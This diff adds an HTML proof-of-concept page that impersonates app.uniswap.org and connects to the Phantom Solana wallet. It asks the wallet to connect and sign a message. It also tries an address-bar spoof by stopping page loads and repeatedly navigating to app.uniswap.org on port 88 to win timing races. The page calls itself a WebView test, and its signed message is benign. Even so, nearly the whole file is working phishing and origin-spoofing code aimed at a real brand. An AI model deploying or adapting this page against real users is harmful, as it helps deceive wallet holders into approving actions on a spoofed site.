@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>app.uniswap.org Connect to Phantom (Solana)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 28px; background:#f7fafc; color:#0f172a }
+    .card { display:inline-block; background:#fff; padding:22px; border-radius:12px; box-shadow:0 6px 24px rgba(2,6,23,0.06); width:340px }
+    button { background-color:#2172e5; color:#fff; border:none; border-radius:8px; padding:10px 18px; font-size:15px; cursor:pointer; margin:8px 6px; }
+    pre { text-align:left; background:#0f172a; color:#e6eef8; padding:12px; border-radius:8px; font-family:ui-monospace,monospace; font-size:13px; overflow:auto; max-height:120px }
+    .muted { color:#6b7280; font-size:13px }
+  </style>
+  <script>
+    async function spoof() {
+      document.body.innerHTML = `
+        <div class="card">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png" alt="Uniswap" width="48" style="display:block;margin:0 auto 10px" />
+          <h2 style="margin:6px 0 8px">app.uniswap.org → Phantom</h2>
+          <p class="muted">This is a PoC page for testing Solana/Phantom connection in WebViews.</p>
+
+          <div style="margin-top:10px">
+            <button id="connect">Connect Wallet</button>
+            <button id="sign">Sign Message</button>
+          </div>
+
+          <p id="pub" class="muted" style="margin-top:12px">Not connected</p>
+          <pre id="log">Ready.\n</pre>
+          <p class="muted" style="font-size:12px;margin-top:8px">Omnibox spoof target: <code>https://app.uniswap.org:88</code></p>
+        </div>
+      `;
+
+      const logEl = document.getElementById('log');
+      const log = (s) => { logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; };
+
+      // Connect button handler
+      document.getElementById('connect').onclick = async () => {
+        const provider = window.phantom?.solana;
+        if (!provider) {
+          log("[!] Phantom provider not found (window.phantom.solana missing).");
+          alert("Phantom provider not detected in this context.");
+          return;
+        }
+        try {
+          log("[*] Requesting connect...");
+          // This prompts the wallet to connect (user consent required)
+          const resp = await provider.connect();
+          const pk = resp.publicKey?.toString?.() || provider.publicKey?.toString?.();
+          document.getElementById('pub').innerText = pk ? ("Connected: " + pk) : "Connected (no pubkey visible)";
+          log("[+] Connected: " + (pk || JSON.stringify(resp)));
+        } catch (e) {
+          log("[!] Connect failed: " + (e?.message || e));
+        }
+      };
+
+      // Sign message handler (safe test)
+      document.getElementById('sign').onclick = async () => {
+        const provider = window.phantom?.solana;
+        if (!provider) {
+          log("[!] Phantom provider not found.");
+          alert("Phantom provider not detected in this context.");
+          return;
+        }
+        try {
+          // Ensure connected
+          if (!provider.isConnected) {
+            log("[i] Not connected — requesting connect first...");
+            await provider.connect();
+          }
+
+          const message = "Phantom sign test — " + new Date().toISOString();
+          const encoded = new TextEncoder().encode(message);
+
+          log("[*] Requesting signMessage (you'll see a prompt in Phantom)...");
+          // signMessage returns an object with signature (Uint8Array) depending on provider implementation
+          const signed = await provider.signMessage(encoded, "utf8");
+          // signed.signature is typically a Uint8Array (or base58 in some wrappers)
+          let sigPrintable = signed?.signature;
+          // Try to convert to hex/base58 if possible
+          if (sigPrintable instanceof Uint8Array) {
+            sigPrintable = Array.from(sigPrintable).map(b => b.toString(16).padStart(2, '0')).join('');
+          } else if (typeof sigPrintable === "object") {
+            sigPrintable = JSON.stringify(sigPrintable);
+          }
+          log("[+] Message signed: " + sigPrintable);
+          alert("Message signed (see console/log).");
+        } catch (e) {
+          log("[!] signMessage failed: " + (e?.message || e));
+        }
+      };
+
+      // Try to do the omnibox spoofing navigation (same pattern you had)
+      // NOTE: on Android/Chromium this will usually result in an error or show port; still included for timing tests.
+      const trySpoof = () => {
+        try {
+          // initial navigation to create a "loading" state
+          const img = new Image();
+          img.src = "https://www.google.com/favicon.ico?ts=" + Date.now();
+
+          // stop then navigate to the target host:port (repeated)
+          setTimeout(() => {
+            try { window.stop(); } catch (e) { /* ignore */ }
+            document.location = "https://app.uniswap.org:88";
+          }, 300);
+
+          // periodic re-navigation to try timing races
+          setInterval(() => {
+            try { document.location = "https://app.uniswap.org:88"; } catch (e) {}
+          }, 9500);
+        } catch (e) {
+          log("[!] Spoof attempt error: " + (e?.message || e));
+        }
+      };
+
+      trySpoof();
+    }
+
+    window.onload = spoof;
+  </script>
+</head>
+<body></body>
+</html>
